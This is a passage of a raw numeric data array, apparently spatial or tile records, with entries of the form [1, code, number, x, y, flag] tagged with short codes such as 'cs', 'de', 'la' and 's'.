0, 163, 96, 1], [1, "s", 0, 159, 86, 1], [1, "s", 0, 185, 78, 1], [1, "s", 1, 194, 75, 1], [1, "s", 2, 195, 76, 1], [1, "s", 2, 181, 78, 1], [1, "s", 2, 161, 87, 1], [1, "s", 2, 166, 97, 1], [1, "s", 2, 177, 97, 1], [1, "s", 0, 149, 85, 1], [1, "s", 1, 151, 83, 1], [1, "s", 1, 175, 74, 1], [1, "s", 0, 174, 72, 1], [1, "la", 3, 168, 71, 1], [1, "la", 3, 180, 60, 1], [1, "s", 0, 156, 63, 1], [1, "s", 0, 151, 47, 1], [1, "s", 1, 158, 64, 1], [1, "s", 1, 161, 75, 1], [1, "s", 1, 162, 51, 1], [1, "s", 1, 175, 45, 1], [1, "s", 1, 152, 47, 1], [1, "s", 1, 159, 33, 1], [1, "s", 1, 152, 18, 1], [1, "s", 0, 151, 13, 1], [1, "s", 0, 166, 22, 1], [1, "s", 0, 170, 63, 1], [1, "s", 2, 172, 62, 1], [1, "s", 2, 155, 61, 1], [1, "s", 2, 167, 51, 1], [1, "s", 2, 150, 52, 1], [1, "la", 4, 178, 69, 1], [1, "la", 4, 177, 68, 1], [1, "la", 3, 176, 67, 1], [1, "la", 0, 174, 67, 1], [1, "la", 1, 172, 67, 1], [1, "la", 4, 171, 67, 1], [1, "la", 4, 170, 66, 1], [1, "la", 4, 169, 66, 1], [1, "la", 1, 168, 66, 1], [1, "la", 4, 167, 67, 1], [1, "la", 1, 166, 67, 1], [1, "la", 4, 165, 68, 1], [1, "la", 5, 164, 68, 1], [1, "la", 2, 163, 68, 1], [1, "la", 5, 162, 68, 1], [1, "la", 2, 161, 68, 1], [1, "la", 3, 153, 72, 1], [1, "la", 3, 163, 60, 1], [1, "la", 3, 164, 42, 1], [1, "la", 0, 155, 51, 1], [1, "la", 1, 168, 42, 1], [1, "la", 4, 158, 48, 1], [1, "la", 4, 178, 57, 1], [1, "la", 4, 151, 69, 1], [1, "la", 2, 170, 74, 1], [1, "la", 2, 160, 84, 1], [1, "la", 2, 174, 92, 1], [1, "la", 2, 188, 90, 1], [1, "la", 2, 209, 84, 1], [1, "la", 2, 206, 93, 1], [1, "la", 5, 156, 70, 1], [1, "la", 5, 165, 57, 1], [1, "la", 5, 182, 58, 1], [1, "la", 5, 166, 44, 1], [1, "la", 1, 163, 39, 1], [1, "la", 1, 152, 53, 1], [1, "la", 1, 152, 37, 1], [1, "la", 2, 163, 13, 1], [1, "de", 12, 219, 12, 0], [1, "de", 14, 203, 13, 0], [1, "de", 15, 220, 19, 0], [1, "de", 12, 223, 15, 0], [1, "de", 12, 213, 10, 0], [1, "de", 37, 217, 19, 0], [1, "de", 38, 220, 14, 0], [1, "de", 38, 215, 10, 0], [1, "de", 40, 214, 14, 0], [1, "de", 40, 222, 16, 0], [1, "de", 40, 209, 18, 0], [1, "de", 37, 212, 18, 0], [1, "de", 38, 215, 26, 0], [1, "de", 37, 222, 25, 0], [1, "de", 40, 221, 29, 0], [1, "de", 12, 220, 27, 0], [1, "de", 13, 213, 27, 0], [1, "de", 14, 215, 30, 0], [1, "de", 15, 219, 33, 0], [1, "de", 38, 220, 31, 0], [1, "de", 38, 217, 35, 0], [1, "de", 40, 221, 34, 0], [1, "de", 39, 215, 32, 0], [1, "de", 37, 211, 35, 0], [1, "de", 12, 223, 38, 0], [1, "de", 13, 213, 38, 0], [1, "de", 14, 222, 44, 0], [1, "de", 15, 208, 33, 0], [1, "de", 15, 206, 23, 0], [1, "de", 13, 205, 28, 0], [1, "de", 14, 211, 23, 0], [1, "de", 14, 201, 20, 0], [1, "de", 15, 198, 9, 0], [1, "de", 15, 199, 16, 0], [1, "de", 12, 194, 15, 0], [1, "de", 12, 197, 23, 0], [1, "de", 37, 205, 13, 0], [1, "de", 39, 204, 9, 0], [1, "de", 40, 196, 12, 0], [1, "de", 40, 198, 18, 0], [1, "de", 37, 192, 11, 0], [1, "de", 37, 199, 24, 0], [1, "de", 37, 209, 24, 0], [1, "de", 39, 209, 30, 0], [1, "de", 39, 204, 31, 0], [1, "de", 39, 192, 24, 0], [1, "de", 40, 187, 23, 0], [1, "de", 38, 187, 18, 0], [1, "de", 39, 192, 18, 0], [1, "de", 37, 185, 15, 0], [1, "de", 12, 188, 15, 0], [1, "de", 13, 185, 13, 0], [1, "de", 14, 189, 9, 0], [1, "de", 15, 187, 22, 0], [1, "de", 15, 180, 9, 0], [1, "de", 12, 177, 14, 0], [1, "de", 14, 173, 9, 0], [1, "de", 14, 171, 15, 0], [1, "de", 40, 182, 9, 0], [1, "de", 39, 179, 13, 0], [1, "de", 39, 175, 9, 0], [1, "de", 40, 173, 14, 0], [1, "de", 37, 169, 11, 0], [1, "de", 37, 163, 10, 0], [1, "de", 38, 164, 15, 0], [1, "de", 39, 170, 20, 0], [1, "de", 40, 160, 17, 0], [1, "de", 40, 154, 10, 0], [1, "de", 40, 165, 23, 0], [1, "de", 40, 150, 19, 0], [1, "de", 37, 155, 16, 0], [1, "de", 39, 146, 10, 0], [1, "de", 12, 159, 12, 0], [1, "de", 13, 151, 9, 0], [1, "de", 14, 150, 14, 0], [1, "de", 15, 153, 19, 0], [1, "de", 13, 161, 25, 0], [1, "de", 14, 169, 25, 0], [1, "de", 15, 176, 25, 0], [1, "de", 12, 180, 29, 0], [1, "de", 12, 188, 31, 0], [1, "de", 14, 181, 36, 0], [1, "de", 37, 186, 33, 0], [1, "de", 38, 183, 26, 0], [1, "de", 39, 177, 21, 0], [1, "de", 40, 175, 31, 0], [1, "de", 37, 176, 39, 0], [1, "de", 37, 168, 34, 0], [1, "de", 38, 162, 32, 0], [1, "de", 38, 168, 45, 0], [1, "de", 38, 173, 45, 0], [1, "de", 39, 160, 35, 0], [1, "de", 40, 161, 42, 0], [1, "de", 40, 170, 39, 0], [1, "de", 40, 181, 43, 0], [1, "de", 40, 156, 26, 0], [1, "de", 40, 150, 32, 0], [1, "de", 37, 159, 26, 0], [1, "de", 37, 155, 40, 0], [1, "de", 37, 154, 45, 0], [1, "de", 39, 149, 45, 0], [1, "de", 40, 150, 50, 0], [1, "de", 40, 160, 52, 0], [1, "de", 37, 164, 52, 0], [1, "de", 38, 168, 50, 0], [1, "de", 12, 176, 45, 0], [1, "de", 12, 167, 32, 0], [1, "de", 13, 158, 32, 0], [1, "de", 14, 149, 28, 0], [1, "de", 15, 163, 30, 0], [1, "de", 14, 158, 39, 0], [1, "de", 12, 171, 43, 0], [1, "de", 12, 174, 36, 0], [1, "de", 12, 151, 43, 0], [1, "de", 13, 152, 48, 0], [1, "de", 14, 164, 49, 0], [1, "de", 15, 149, 52, 0], [1, "de", 12, 174, 49, 0], [1, "de", 13, 183, 51, 0], [1, "de", 14, 186, 48, 0], [1, "de", 37, 182, 48, 0], [1, "de", 38, 187, 52, 0], [1, "de", 39, 188, 43, 0], [1, "de", 37, 200, 38, 0], [1, "de", 40, 194, 37, 0], [1, "de", 39, 199, 44, 0], [1, "de", 38, 200, 49, 0], [1, "de", 37, 196, 54, 0], [1, "de", 12, 194, 40, 0], [1, "de", 13, 202, 45, 0], [1, "de", 14, 198, 47, 0], [1, "de", 15, 198, 55, 0], [1, "de", 15, 212, 54, 0], [1, "de", 15, 216, 63, 0], [1, "de", 14, 209, 62, 0], [1, "de", 12, 219, 60, 0], [1, "de", 12, 206, 56, 0], [1, "de", 12, 218, 72, 0], [1, "de", 12, 223, 67, 0], [1, "de", 12, 205, 64, 0], [1, "de", 12, 193, 63, 0], [1, "de", 14, 216, 80, 0], [1, "de", 14, 222, 87, 0], [1, "de", 38, 210, 53, 0], [1, "de", 37, 210, 47, 0], [1, "de", 37, 200, 63, 0], [1, "de", 37, 218, 62, 0], [1, "de", 37, 222, 60, 0], [1, "de", 37, 207, 70, 0], [1, "de", 38, 203, 68, 0], [1, "de", 38, 195, 66, 0], [1, "de", 38, 218, 55, 0], [1, "de", 38, 212, 61, 0], [1, "de", 38, 222, 70, 0], [1, "de", 38, 218, 70, 0], [1, "de", 40, 222, 81, 0], [1, "de", 38, 214, 79, 0], [1, "de", 39, 213, 83, 0], [1, "de", 39, 207, 76, 0], [1, "de", 39, 208, 86, 0], [1, "de", 39, 218, 87, 0], [1, "de", 39, 222, 93, 0], [1, "de", 39, 216, 96, 0], [1, "de", 39, 209, 94, 0], [1, "de", 39, 201, 87, 0], [1, "de", 39, 198, 82, 0], [1, "de", 39, 207, 99, 0], [1, "de", 39, 200, 97, 0], [1, "de", 39, 202, 92, 0], [1, "de", 37, 194, 97, 0], [1, "de", 39, 204, 88, 0], [1, "de", 39, 189, 90, 0], [1, "de", 39, 194, 81, 0], [1, "de", 39, 188, 98, 0], [1, "de", 37, 183, 91, 0], [1, "de", 37, 186, 80, 0], [1, "de", 37, 191, 72, 0], [1, "de", 38, 184, 77, 0], [1, "de", 38, 180, 80, 0], [1, "de", 39, 173, 75, 0], [1, "de", 40, 178, 87, 0], [1, "de", 40, 174, 94, 0], [1, "de", 40, 192, 93, 0], [1, "de", 40, 165, 92, 0], [1, "de", 37, 160, 89, 0], [1, "de", 38, 161, 85, 0], [1, "de", 38, 164, 98, 0], [1, "de", 38, 151, 99, 0], [1, "de", 38, 151, 85, 0], [1, "de", 40, 148, 83, 0], [1, "de", 40, 160, 77, 0], [1, "de", 40, 167, 77, 0], [1, "de", 40, 153, 69, 0], [1, "de", 40, 149, 74, 0], [1, "de", 37, 161, 64, 0], [1, "de", 37, 154, 61, 0], [1, "de", 39, 157, 55, 0], [1, "de", 39, 174, 64, 0], [1, "de", 39, 175, 56, 0], [1, "de", 39, 149, 67, 0], [1, "de", 12, 218, 96, 0], [1, "de", 13, 212, 95, 0], [1, "de", 14, 204, 85, 0], [1, "de", 15, 215, 85, 0], [1, "de", 15, 197, 97, 0], [1, "de", 12, 198, 87, 0], [1, "de", 14, 196, 77, 0], [1, "de", 13, 194, 86, 0], [1, "de", 15, 181, 84, 0], [1, "de", 14, 184, 79, 0], [1, "de", 14, 188, 93, 0], [1, "de", 13, 180, 87, 0], [1, "de", 13, 178, 96, 0], [1, "de", 13, 163, 95, 0], [1, "de", 15, 172, 88, 0], [1, "de", 15, 176, 75, 0], [1, "de", 14, 172, 72, 0], [1, "de", 14, 169, 82, 0], [1, "de", 13, 164, 78, 0], [1, "de", 13, 158, 87, 0], [1, "de", 13, 149, 86, 0], [1, "de", 15, 154, 91, 0], [1, "de", 15, 160, 74, 0], [1, "de", 14, 152, 76, 0], [1, "de", 14, 158, 63, 0], [1, "de", 14, 150, 60, 0], [1, "de", 12, 169, 59, 0], [1, "de", 13, 173, 61, 0], [1, "cs", 1, 143, 104, 1], [1, "cs", 0, 141, 102, 1], [1, "cs", 3, 138, 102, 1], [1, "cs", 2, 139, 102, 1], [1, "cs", 2, 140, 102, 1], [1, "cs", 3, 143, 107, 1], [1, "cs", 0, 143, 106, 1], [1, "cs", 2, 143, 105, 1], [1, "cs", 2, 142, 103, 1], [1, "cs", 0, 142, 104, 1], [1, "cs", 2, 141, 103, 1], [1, "cs", 3, 142, 105, 1], [1, "cs", 3, 140, 103, 1], [1, "cs", 3, 141, 104, 1], [1, "la", 4, 151, 23, 1], [1, "la", 4, 150, 22, 1], [1, "la", 1, 149, 21, 1], [1, "la", 4, 148, 21, 1], [1, "la", 2, 147, 20, 1], [1, "la", 4, 147, 19, 1], [1, "la", 5, 147, 18, 1], [1, "la", 1, 147, 17, 1], [1, "la", 3, 144, 9, 1], [1, "la", 5, 147, 16, 1], [1, "la", 2, 147, 15, 1], [1, "la", 4, 147, 14, 1], [1, "la", 4, 145, 11, 1], [1, "la", 5, 145, 12, 1], [1, "la", 1, 146, 13, 1], [1, "la", 2, 145, 13, 1], [1, "la", 3, 155, 25, 1], [1, "la", 0, 155, 24, 1], [1, "la", 3, 153, 26, 1], [1, "cs", 0, 151, 24, 1], [1, "cs", 0, 153, 22, 1], [1, "cs", 3, 152, 22, 1], [1, "cs", 3, 154, 22, 1], [1, "cs", 1, 157, 26, 1], [1, "cs", 2, 157, 24, 1], [1, "cs", 2, 156, 26, 1], [1, "cs", 2, 154, 28, 1], [1, "cs", 2, 151, 26, 1], [1, "cs", 2, 152, 25, 1], [1, "cs", 2, 151, 25, 1], [1, "cs", 2, 156, 27, 1], [1, "cs", 2, 157, 23, 1], [1, "cs", 2, 157, 22, 1], [1, "cs", 3, 150, 24, 1], [1, "cs", 3, 150, 23, 1], [1, "de", 38, 155, 29, 0], [1, "de", 12, 157, 27, 0], [1, "de", 14, 153, 29, 0], [1, "de", 15, 158, 23, 0], [1, "de", 13, 156, 21, 0], [1, "de", 13, 147, 36, 0], [1, "de", 13, 161, 56, 0], [1, "de", 13, 147, 79, 0], [1, "de", 12, 157, 99, 0], [1, "de", 12, 172, 99, 0], [1, "la", 3, 143, 102, 1], [1, "la", 4, 149, 96, 1], [1, "la", 4, 145, 102, 1], [1, "la", 1, 148, 97, 1], [1, "la", 5, 148, 98, 1], [1, "cs", 3, 144, 104, 1], [1, "cs", 3, 144, 103, 1], [1, "cs", 3, 145, 103, 1], [1, "cs", 3, 145, 104, 1], [1, "cs", 3, 142, 101, 1], [1, "cs", 3, 143, 100, 1], [1, "cs", 3, 141, 101, 1], [1, "cs", 3, 142, 100, 1], [1, "cs", 0, 141, 100, 1], [1, "cs", 2, 140, 101, 1], [1, "cs", 2, 144, 105, 1], [1, "cs", 3, 146, 103, 1], [1, "cs", 3, 146, 102, 1], [1, "cs", 3, 150, 95, 1], [1, "cs", 0, 150, 97, 1], [1, "cs", 2, 151, 98, 1], [1, "cs", 0, 153, 97, 1], [1, "cs", 3, 153, 96, 1], [1, "cs", 2, 149, 95, 1], [1, "s", 0, 213, 127, 1], [1, "plm", 1, 214, 131, 0], [1, "plm", 1, 207, 128, 0], [1, "plm", 0, 208, 127, 0], [1, "s", 1, 207, 132, 1], [1, "s", 2, 208, 133, 1], [1, "plm", 0, 217, 132, 0], [1, "plm", 2, 186, 158, 0], [1, "plm", 0, 184, 160, 0], [1, "s", 1, 183, 156, 1], [1, "s", 2, 186, 159, 1], [1, "p", 0, 182, 157, 1], [1, "p", 0, 114, 205, 1], [1, "plm", 1, 117, 204, 0], [1, "plm", 0, 117, 205, 0], [1, "plm", 2, 112, 204, 0], [1, "s", 2, 114, 207, 1], [1, "s", 2, 115, 204, 1], [1, "plm", 2, 122, 151, 0], [1, "plm", 1, 123, 150, 0], [1, "plm", 1, 117, 151, 0], [1, "s", 0, 118, 150, 1], [1, "s", 1, 122, 152, 1], [1, "plm", 2, 156, 130, 0], [1, "plm", 1, 154, 127, 0], [1, "s", 0, 153, 128, 1], [1, "s", 2, 152, 130, 1], [1, "p", 0, 123, 65, 1], [1, "plm", 2, 125, 62, 0], [1, "plm", 1, 124, 62, 0], [1, "plm", 0, 120, 65, 0], [1, "s", 1, 125, 63, 1], [1, "s", 1, 121, 64, 1], [1, "s", 2, 122, 62, 1], [1, "cs", 0, 140, 106, 1], [1, "cs", 2, 144, 106, 1], [1, "cs", 2, 145, 105, 1], [1, "cs", 2, 144, 107, 1], [1, "cs", 2, 141, 106, 1], [1, "cs", 2, 141, 105, 1], [1, "cs", 2, 140, 105, 1], [1, "cs", 2, 140, 104, 1], [1, "cs", 1, 138, 103, 1], [1, "cs", 0, 139, 104, 1], [1, "cs", 2, 139, 103, 1], [1, "cs", 2, 139, 105, 1], [1, "cs", 2, 142, 106, 1], [1, "cs", 2, 142, 107, 1], [1, "cs", 2, 139, 101, 1], [1, "de", 19, 27, 264, 0], [1, "la", 4, 147, 99, 1], [1, "la", 1, 146, 100, 1], [1, "la", 4, 145, 101, 1], [1, "cs", 1, 215, 47, 1], [1, "cs", 2, 216, 47, 1], [1, "cs", 2, 215, 48, 1], [1, "la", 4, 214, 45, 1], [1, "la", 4, 215, 45, 1], [1, "la", 0, 216, 46, 1], [1, "la", 4, 216, 48, 1], [1, "la", 4, 216, 49, 1], [1, "la", 4, 217, 50, 1], [1, "la", 3, 214, 49, 1], [1, "la", 4, 211, 45, 1], [1, "la", 3, 213, 47, 1], [1, "cs", 2, 224, 48, 1], [1, "plm", 2, 111, 243, 0], [1, "plm", 1, 108, 246, 0], [1, "s", 1, 110, 243, 1], [1, "s", 0, 108, 245, 1], [1, "s", 0, 121, 276, 1], [1, "plm", 2, 122, 277, 0], [1, "plm", 2, 117, 276, 0], [1, "plm", 1, 118, 277, 0], [1, "s", 1, 118, 278, 1], [1, "cs", 2, 66, 16, 1], [1, "cs", 3, 67, 16, 1], [1, "cs", 0, 67, 17, 1], [1, "cs", 2, 66, 17, 1], [1, "cs", 3, 66, 18, 1], [1, "cs", 3, 68, 17, 1], [1, "cs", 0, 36, 16, 1], [1, "cs", 2, 36, 17, 1], [1, "cs", 2, 36, 18, 1], [1, "cs", 3, 35, 17, 1], [1, "cs", 3, 36, 19, 1], [1, "cs", 3, 35, 18, 1], [1, "cs", 2, 66, 30, 1], [1, "cs", 2, 66, 23, 1], [1, "cs", 3, 66, 22, 1], [1, "cs", 3, 66, 31, 1], [1, "cs", 2, 36, 30, 1], [1, "cs", 2, 36, 23, 1], [1, "cs", 1, 36, 22, 1], [1, "cs", 2, 36, 31, 1], [1, "cs", 3, 42, 13, 1], [1, "cs", 0, 43, 13, 1], [1, "cs", 2, 44, 13, 1], [1, "cs", 3, 42, 16, 1], [1, "cs", 3, 41, 16, 1], [1, "cs", 3, 40, 16, 1], [1, "cs", 0, 42, 19, 1], [1, "cs", 3, 43, 19, 1], [1, "cs", 3, 44, 19, 1], [1, "cs", 3, 45, 19, 1], [1, "cs", 2, 46, 19, 1], [1, "cs", 0, 43, 22, 1], [1, "cs", 2, 42, 22, 1], [1, "cs", 1, 41, 22, 1], [1, "cs", 0, 40, 22, 1], [1, "cs", 3, 39, 17, 1], [1, "cs", 1, 44, 26, 1], [1, "cs", 2, 45, 26, 1], [1, "cs", 3, 46, 26, 1], [1, "cs", 0, 47, 26, 1], [1, "cs", 2, 48, 26, 1], [1, "cs", 3, 47, 25, 1], [1, "cs", 3, 43, 27, 1], [1, "cs", 1, 49, 32, 1], [1, "cs", 2, 50, 32, 1], [1, "cs", 2, 51, 32, 1], [1, "cs", 2, 52, 32, 1], [1, "d", 0, 51, 29, 1], [1, "d", 1, 53, 29, 1], [1, "d", 1, 49, 29, 1], [1, "cs", 3, 55, 31, 1], [1, "cs", 3, 54, 32, 1], [1, "cs", 3, 47, 31, 1], [1, "cs", 3, 48, 32, 1], [1, "cs", 0, 51, 33, 1], [1, "cs", 2, 52, 33, 1], [1, "cs", 2, 50, 33, 1], [1, "cs", 3, 56, 30, 1], [1, "cs", 3, 56, 31, 1], [1, "cs", 3, 46, 30, 1], [1, "cs", 3, 46, 31, 1], [1, "cs", 1, 53, 33, 1], [1, "cs", 2, 49, 33, 1], [1, "cs", 2, 53, 32, 1], [1, "cs", 0, 55, 32, 1], [1, "cs", 0, 47, 32, 1], [1, "d", 1, 54, 35, 1], [1, "fo", 2, 35, 15, 0], [1, "fo", 2, 36, 12, 0], [1, "fo", 2, 67, 15, 0], [1, "cs", 3, 60, 13, 1], [1, "cs", 2, 59, 13, 1], [1, "cs", 1, 58, 13, 1], [1, "cs", 3, 62, 16, 1], [1, "cs", 0, 61, 16, 1], [1, "cs", 3, 60, 16, 1], [1, "cs", 3, 63, 17, 1], [1, "cs", 2, 60, 19, 1], [1, "cs", 1, 59, 19, 1], [1, "cs", 3, 58, 19, 1], [1, "cs", 2, 57, 19, 1], [1, "cs", 2, 56, 19, 1], [1, "cs", 0, 55, 18, 1], [1, "cs", 2, 55, 17, 1], [1, "cs", 2, 63, 23, 1], [1, "cs", 0, 62, 22, 1], [1, "cs", 2, 61, 22, 1], [1, "cs", 1, 60, 22, 1], [1, "cs", 0, 59, 22, 1], [1, "cs", 2, 54, 26, 1], [1, "cs", 2, 55, 26, 1], [1, "cs", 2, 56, 26, 1], [1, "cs", 1, 57, 26, 1], [1, "cs", 2, 58, 26, 1], [1, "cs", 2, 59, 27, 1], [1, "cs", 2, 68, 16, 1], [1, "cs", 2, 68, 15, 1], [1, "cs", 3, 69, 15, 1], [1, "cs", 3, 70, 15, 1], [1, "cs", 3, 70, 14, 1], [1, "cs", 1, 69, 14, 1], [1, "cs", 1, 69, 16, 1], [1, "cs", 2, 71, 13, 1], [1, "cs", 2, 71, 14, 1], [1, "cs", 3, 72, 13, 1], [1, "cs", 3, 70, 8, 1], [1, "cs", 3, 71, 8, 1], [1, "cs", 2, 72, 8, 1], [1, "cs", 0, 73, 8, 1], [1, "cs", 3, 74, 9, 1], [1, "cs", 3, 74, 8, 1], [1, "cs", 0, 75, 8, 1], [1, "cs", 3, 76, 8, 1], [1, "cs", 3, 75, 9, 1], [1, "cs", 3, 75, 10, 1], [1, "cs", 0, 76, 10, 1], [1, "cs", 0, 76, 16, 1], [1, "cs", 3, 76, 15, 1], [1, "cs", 3, 75, 16, 1], [1, "cs", 2, 77, 11, 1], [1, "cs", 2, 77, 14, 1], [1, "cs", 3, 77, 12, 1], [1, "cs", 3, 77, 13, 1], [1, "cs", 3, 77, 15, 1], [1, "cs", 0, 74, 18, 1], [1, "cs", 1, 75, 17, 1], [1, "cs", 2, 74, 17, 1], [1, "cs", 3, 73, 19, 1], [1, "cs", 3, 67, 23, 1], [1, "cs", 0, 68, 23, 1], [1, "cs", 0, 72, 20, 1], [1, "cs", 2, 73, 20, 1], [1, "cs", 2, 74, 19, 1], [1, "cs", 2, 74, 36, 1], [1, "cs", 2, 77, 27, 1], [1, "cs", 2, 76, 26, 1], [1, "cs", 2, 75, 26, 1], [1, "cs", 0, 74, 26, 1], [1, "cs", 2, 75, 25, 1], [1, "cs", 0, 76, 25, 1], [1, "cs", 1, 77, 23, 1], [1, "cs", 2, 77, 16, 1], [1, "cs", 2, 76, 17, 1], [1, "cs", 2, 76, 24, 1], [1, "cs", 2, 77, 24, 1], [1, "cs", 2, 77, 25, 1], [1, "cs", 2, 77, 26, 1], [1, "cs", 1, 75, 27, 1], [1, "cs", 3, 76, 27, 1], [1, "cs", 2, 67, 24, 1], [1, "cs", 2, 66, 24, 1], [1, "cs", 2, 73, 26, 1], [1, "cs", 2, 74, 27, 1], [1, "cs", 2, 74, 25, 1], [1, "cs", 2, 66, 19, 1], [1, "cs", 2, 66, 20, 1], [1, "cs", 2, 66, 21, 1], [1, "cs", 2, 67, 18, 1], [1, "cs", 2, 67, 22, 1], [1, "cs", 0, 77, 36, 1], [1, "cs", 0, 77, 32, 1], [1, "cs", 1, 75, 35, 1], [1, "cs", 2, 75, 36, 1], [1, "cs", 2, 76, 36, 1], [1, "cs", 2, 77, 35, 1], [1, "cs", 2, 77, 34, 1], [1, "cs", 2, 76, 35, 1], [1, "cs", 2, 77, 33, 1], [1, "cs", 2, 77, 31, 1], [1, "cs", 0, 77, 29, 1], [1, "cs", 0, 71, 32, 1], [1, "cs", 0, 76, 34, 1], [1, "cs", 2, 77, 30, 1], [1, "cs", 2, 77, 28, 1], [1, "cs", 2, 76, 28, 1], [1, "cs", 2, 75, 28, 1], [1, "cs", 2, 76, 29, 1], [1, "cs", 2, 76, 33, 1], [1, "cs", 2, 70, 32, 1], [1, "cs", 2, 69, 31, 1], [1, "cs", 0, 68, 31, 1], [1, "cs", 2, 67, 31, 1], [1, "cs", 2, 67, 30, 1], [1, "cs", 2, 69, 32, 1], [1, "cs", 1, 67, 32, 1], [1, "cs", 2, 68, 32, 1], [1, "cs", 2, 66, 32, 1], [1, "cs", 2, 66, 33, 1], [1, "cs", 2, 67, 33, 1], [1, "cs", 2, 70, 33, 1], [1, "cs", 2, 69, 33, 1], [1, "cs", 2, 68, 33, 1], [1, "cs", 0, 68, 34, 1], [1, "cs", 1, 66, 35, 1], [1, "cs", 2, 67, 34, 1], [1, "cs", 2, 66, 34, 1], [1, "cs", 2, 65, 35, 1], [1, "cs", 2, 64, 36, 1], [1, "cs", 2, 65, 36, 1], [1, "cs", 2, 67, 35, 1], [1, "cs", 2, 66, 36, 1], [1, "cs", 2, 69, 34, 1], [1, "cs", 2, 68, 35, 1], [1, "cs", 2, 76, 9, 1], [1, "cs", 2, 77, 9, 1], [1, "cs", 2, 77, 8, 1], [1, "cs", 2, 77, 10, 1], [1, "cs", 2, 78, 8, 1], [1, "cs", 2, 78, 9, 1], [1, "cs", 2, 78, 10, 1], [1, "cs", 2, 78, 11, 1], [1, "cs", 2, 78, 12, 1], [1, "cs", 2, 78, 13, 1], [1, "cs", 0, 79, 9, 1], [1, "cs", 1, 79, 11, 1], [1, "cs", 3, 79, 8, 1], [1, "cs", 3, 79, 10, 1], [1, "cs", 3, 79, 12, 1], [1, "cs", 3, 80, 8, 1], [1, "cs", 1, 80, 10, 1], [1, "cs", 2, 80, 9, 1], [1, "cs", 2, 80, 11, 1], [1, "cs", 2, 81, 8, 1], [1, "cs", 2, 81, 9, 1], [1, "cs", 2, 81, 10, 1], [1, "cs", 2, 78, 14, 1], [1, "cs", 2, 79, 13, 1], [1, "cs", 2, 78, 15, 1], [1, "cs", 2, 80, 12, 1], [1, "cs", 0, 79, 14, 1], [1, "cs", 0, 82, 9, 1], [1, "cs", 2, 82, 8, 1], [1, "cs", 2, 82, 10, 1], [1, "cs", 2, 81, 11, 1], [1, "cs", 3, 80, 13, 1], [1, "cs", 1, 78, 30, 1], [1, "cs", 1, 78, 34, 1], [1, "cs", 1, 78, 27, 1], [1, "cs", 0, 78, 25, 1], [1, "cs", 0, 79, 29, 1], [1, "cs", 0, 79, 32, 1], [1, "cs", 0, 79, 35, 1], [1, "cs", 2, 78, 35, 1], [1, "cs", 2, 78, 36, 1], [1, "cs", 2, 79, 34, 1], [1, "cs", 2, 78, 33, 1], [1, "cs", 2, 79, 33, 1], [1, "cs", 2, 78, 32, 1], [1, "cs", 2, 78, 31, 1], [1, "cs", 2, 79, 31, 1], [1, "cs", 2, 79, 30, 1], [1, "cs", 2, 78, 29, 1], [1, "cs", 2, 78, 28, 1], [1, "cs", 2, 79, 28, 1], [1, "cs", 2, 79, 27, 1], [1, "cs", 2, 78, 26, 1], [1, "cs", 2, 79, 26, 1], [1, "cs", 2, 78, 24, 1], [1, "cs", 2, 80, 34, 1], [1, "cs", 2, 80, 33, 1], [1, "cs", 2, 80, 31, 1], [1, "cs", 2, 80, 30, 1], [1, "cs", 2, 80, 32, 1], [1, "cs", 2, 80, 29, 1], [1, "cs", 2, 80, 28, 1], [1, "cs", 2, 80, 27, 1], [1, "cs", 0, 81, 30, 1], [1, "cs", 1, 81, 32, 1], [1, "cs", 1, 81, 28, 1], [1, "cs", 2, 81, 29, 1], [1, "cs", 2, 81, 31, 1], [1, "cs", 2, 81, 33, 1], [1, "cs", 2, 82, 30, 1], [1, "cs", 2, 82, 31, 1], [1, "cs", 2, 82, 32, 1], [1, "cs", 0, 37, 36, 1], [1, "cs", 2, 38, 36, 1], [1, "cs", 2, 37, 35, 1], [1, "cs", 2, 36, 36, 1], [1, "cs", 2, 34, 35, 1], [1, "cs", 2, 35, 35, 1], [1, "cs", 2, 36, 35, 1], [1, "cs", 0, 33, 34, 1], [1, "cs", 1, 35, 34, 1], [1, "cs", 2, 36, 34, 1], [1, "cs", 2, 34, 34, 1], [1, "cs", 2, 36, 33, 1], [1, "cs", 2, 35, 33, 1], [1, "cs", 2, 34, 33, 1], [1, "cs", 2, 33, 33, 1], [1, "cs", 2, 31, 32, 1], [1, "cs", 1, 36, 32, 1], [1, "cs", 1, 32, 32, 1], [1, "cs", 2, 35, 32, 1], [1, "cs", 2, 33, 32, 1], [1, "cs", 2, 32, 33, 1], [1, "cs", 2, 33, 31, 1], [1, "cs", 2, 34, 31, 1], [1, "cs", 2, 35, 31, 1], [1, "cs", 0, 34, 32, 1], [1, "cs", 2, 35, 30, 1], [1, "cs", 1, 39, 23, 1], [1, "cs", 3, 39, 22, 1], [1, "cs", 3, 36, 24, 1], [1, "cs", 3, 35, 24, 1], [1, "cs", 2, 34, 23, 1], [1, "cs", 2, 35, 23, 1], [1, "cs", 2, 36, 20, 1], [1, "cs", 2, 36, 21, 1], [1, "cs", 2, 35, 22, 1], [1, "cs", 2, 35, 16, 1], [1, "cs", 2, 34, 16, 1], [1, "cs", 2, 33, 16, 1], [1, "cs", 0, 34, 17, 1], [1, "cs", 0, 32, 15, 1], [1, "cs", 2, 31, 14, 1], [1, "cs", 3, 30, 13, 1], [1, "cs", 1, 33, 15, 1], [1, "cs", 1, 31, 13, 1], [1, "cs", 2, 32, 14, 1], [1, "cs", 0, 31, 8, 1], [1, "cs", 2, 32, 8, 1], [1, "cs", 2, 25, 13, 1], [1, "cs", 0, 25, 12, 1], [1, "cs", 2, 25, 11, 1], [1, "cs", 3, 25, 10, 1], [1, "cs", 0, 25, 9, 1], [1, "cs", 2, 25, 8, 1], [1, "cs", 2, 26, 8, 1], [1, "cs", 2, 27, 8, 1], [1, "cs", 2, 28, 8, 1], [1, "cs", 2, 29, 8, 1], [1, "cs", 2, 30, 8, 1], [1, "cs", 2, 26, 9, 1], [1, "cs", 2, 27, 9, 1], [1, "cs", 2, 26, 10, 1], [1, "cs", 1, 27, 10, 1], [1, "cs", 3, 28, 9, 1], [1, "cs", 3, 25, 14, 1], [1, "cs", 0, 25, 15, 1], [1, "cs", 2, 26, 15, 1], [1, "cs", 3, 27, 16, 1], [1, "cs", 0, 28, 17, 1], [1, "cs", 1, 29, 18, 1], [1, "cs", 2, 26, 16, 1], [1, "cs", 2, 25, 16, 1], [1, "cs", 2, 27, 17, 1], [1, "cs", 2, 26, 17, 1], [1, "cs", 1, 27, 18, 1], [1, "cs", 2, 28, 18, 1], [1, "cs", 2, 30, 19, 1], [1, "cs", 2, 29, 19, 1], [1, "cs", 2, 24, 14, 1], [1, "cs", 2, 24, 15, 1], [1, 